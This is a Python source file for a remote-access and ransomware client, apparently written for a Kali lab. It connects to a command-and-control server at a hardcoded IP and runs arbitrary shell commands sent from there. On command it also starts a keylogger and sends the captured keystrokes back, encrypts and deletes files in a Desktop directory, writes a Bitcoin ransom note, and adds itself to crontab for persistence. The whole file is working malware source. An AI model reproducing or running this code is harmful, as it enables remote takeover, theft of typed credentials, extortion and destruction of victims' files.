import binascii
import socket
import os
import threading
import subprocess

from pynput import keyboard


# Keylogger log file path
keylog_file = "/tmp/keylog.txt"

# AES key file path
aes_key_file = "/tmp/aes_key.key"
# AES IV file
aes_iv_file = "/tmp/aes_iv.key"

# Log file path
log_file = "/tmp/ransomware_log.txt"
# Encrypted file suffix
encrypted_suffix = ".enc"

# Key mapping table for formatting special keys
key_mapping = {
    "Key.space": " ",          # Space
    "Key.enter": "[ENTER]\n",    # Enter
    "Key.tab": "[TAB]",        # Tab
    "Key.backspace": "[BACKSPACE]",  # Backspace
    "Key.shift": "[SHIFT]",    # Shift key
    "Key.ctrl_l": "[CTRL]",    # Left Ctrl
    "Key.alt_l": "[ALT]",      # Left Alt
    "Key.esc": "[ESC]",        # Esc key
}

# Handle key press events
def on_press(key):
    try:
        with open(keylog_file, "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(key.char)
            else:
                key_str = str(key).replace("'", "")
                formatted_key = key_mapping.get(key_str, f"[{key_str}]")
                f.write(formatted_key)
            f.flush()  # Force flush the file buffer
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"[ERROR: {e}]\n")


# Start keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylogger_background():
    thread = threading.Thread(target=start_keylogger, daemon=True)
    thread.start()
    print("[DEBUG] Keylogger started in the background.")

def read_keylog():
    """Read the contents of the keylogger file"""
    try:
        print("[DEBUG] Attempting to read keylog file.")
        with open(keylog_file, "r") as f:
            content = f.read()
            print(f"[DEBUG] Keylog file content: {content}")
            return content
    except FileNotFoundError:
        print("[DEBUG] Keylog file not found.")
        return "Keylog file not found."
    except Exception as e:
        print(f"[DEBUG] Error reading keylog: {e}")
        return f"Error reading keylog: {e}"

# Call encryption script
def encrypt_file_gcm(input_file, output_file):
    """Call GCM mode encryption script to encrypt file"""
    try:
        subprocess.run(
            [
                "python3", "aes-encrypt.py",
                "-key", aes_key_file,
                "-IV", aes_iv_file,
                "-mode", "gcm",
                "-input", input_file,
                "-out", output_file
            ],
            check=True
        )
        # Confirm encrypted file exists
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(f"[DEBUG] Encrypted: {input_file} -> {output_file}")
        else:
            print(f"[ERROR] Encryption failed for {input_file}")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to encrypt {input_file}: {e}")

# Call decryption script
def decrypt_file_gcm(input_file, output_file):
    """Call GCM mode decryption script to decrypt file"""
    try:
        subprocess.run(
            [
                "python3", "aes-decrypt.py",
                "-key", aes_key_file,
                "-IV", aes_iv_file,
                "-mode", "gcm",
                "-input", input_file,
                "-out", output_file
            ],
            check=True
        )
        print(f"[DEBUG] Decrypted: {input_file} -> {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to decrypt {input_file}: {e}")
    except Exception as e:
        print(f"[ERROR] Unexpected error during decryption: {e}")

def encrypt_directory_gcm(client, directory="/home/kali/Desktop"):
    create_key_and_iv()
    feedback = []  # To store feedback messages
    for root, _, files in os.walk(directory):
        for file in files:
            input_file = os.path.join(root, file)
            output_file = f"{input_file}{encrypted_suffix}"
            encrypt_file_gcm(input_file, output_file)
            os.remove(input_file)  # Delete original file
            feedback.append(f"[INFO] Encrypted: {input_file}")
    create_ransom_note()
    feedback.append("\nEncryption completed.")
    # Send all feedback messages at once
    client.send("\n".join(feedback).encode())
    print("[DEBUG] Encryption completed.")

# Decrypt directory
def decrypt_directory_gcm(client, directory="/home/kali/Desktop"):
    feedback = []  # To store feedback messages
    client.send("Starting decryption of /home/kali/Desktop directory.".encode())
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(encrypted_suffix):
                input_file = os.path.join(root, file)
                output_file = input_file.rstrip(encrypted_suffix)
                decrypt_file_gcm(input_file, output_file)
                os.remove(input_file)  # Delete encrypted file
                # Send feedback to server about decrypted file
                feedback.append(f"[INFO] Decrypted: {input_file}")
    feedback.append("\nDecryption completed.")
    client.send("\n".join(feedback).encode())
    print("[DEBUG] Decryption completed.")

# Create key and IV files
def create_key_and_iv():
    """Generate key and IV files (if they do not exist)"""
    if not os.path.exists(aes_key_file):
        # Generate a 256-bit key (32 bytes)
        raw_key = os.urandom(32)
        hex_key = binascii.hexlify(raw_key).decode()  # Convert to hexadecimal string
        with open(aes_key_file, "w") as f:
            f.write(hex_key)  # Save in hexadecimal format
        print(f"[DEBUG] AES key generated and saved as hex: {aes_key_file}")
    else:
        print(f"[DEBUG] Using existing AES key: {aes_key_file}")

    if not os.path.exists(aes_iv_file):
        # Generate a 96-bit IV (12 bytes, suitable for GCM)
        raw_iv = os.urandom(12)
        hex_iv = binascii.hexlify(raw_iv).decode()  # Convert to hexadecimal string
        with open(aes_iv_file, "w") as f:
            f.write(hex_iv)  # Save in hexadecimal format
        print(f"[DEBUG] AES IV generated and saved as hex: {aes_iv_file}")
    else:
        print(f"[DEBUG] Using existing AES IV: {aes_iv_file}")

# Create ransom note
def create_ransom_note():
    ransom_note = """
    Your files in the /home/kali/Desktop directory have been encrypted. 
    Pay 1 BTC to wallet Hassan to retrieve your decryption key.
    """
    ransom_note_path = "/home/kali/Desktop/README_RESTORE.txt"
    with open(ransom_note_path, "w") as f:
        f.write(ransom_note)
    print(f"[DEBUG] Ransom note created: {ransom_note_path}")

def connect_to_c2():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("192.168.2.35", 9090))
    print("[DEBUG] Connected to C2 server at 192.168.2.35:9090")

    while True:
        try:
            command = client.recv(1024).decode()
            if not command:
                print("[DEBUG] No command received. Closing connection.")
                break

            print(f"[DEBUG] Received command: {command}")

            if command.lower() == "exit":
                print("[DEBUG] Exit command received. Exiting client.")
                client.send("Exiting client.".encode())
                break

            elif command.lower().startswith("exec"):
                # Execute arbitrary system command
                try:
                    command_to_execute = command.split(" ", 1)[1]
                    print(f"[DEBUG] Executing system command: {command_to_execute}")
                    output = os.popen(command_to_execute).read()
                    client.send(('[INFO] command results: \n'+output).encode())
                    print("[DEBUG] Command executed and result sent.")
                except Exception as e:
                    error_message = f"Error executing command: {e}"
                    client.send(error_message.encode())
                    print(f"[DEBUG] {error_message}")

            elif command.lower() == "keylog_start":
                print("[DEBUG] Starting keylogger in the background.")
                start_keylogger_background()
                client.send("[INFO]Keylogger started in the background.".encode())

            elif command.lower() == "read_keylog":
                print("[DEBUG] Reading keylog file.")
                response = read_keylog()
                if response:
                    client.send(('[INFO] keylog info:\n'+response).encode())
                    print("[DEBUG] Keylog data sent to server.")
                else:
                    client.send("Keylog file is empty or not available.".encode())


            elif command.lower() == "encrypt":
                print("[DEBUG] Encrypting files in /home/kali/Desktop directory.")
                client.send("Starting encryption of /home/kali/Desktop directory.\n".encode())
                encrypt_directory_gcm(client)


            elif command.lower() == "decrypt":
                print("[DEBUG] Decrypting files in /home/kali/Desktop directory.")
                decrypt_directory_gcm(client)  # Call GCM mode decryption function

            else:
                print(f"[DEBUG] Unknown command received: {command}")
                client.send("Unknown command.".encode())

        except Exception as e:
            error_message = f"An error occurred: {e}"
            client.send(error_message.encode())
            print(f"[DEBUG] {error_message}")
            break

    client.close()
    print("[DEBUG] Connection closed.")

# Persistence function
def add_to_crontab():
    current_script = os.path.realpath(__file__)
    cron_job = f"@reboot python3 {current_script}\n"
    os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -")
    print("Added to crontab for persistence.")

if __name__ == "__main__":
    # Start C2 client
    connect_to_c2()
    # Add persistence
    add_to_crontab()
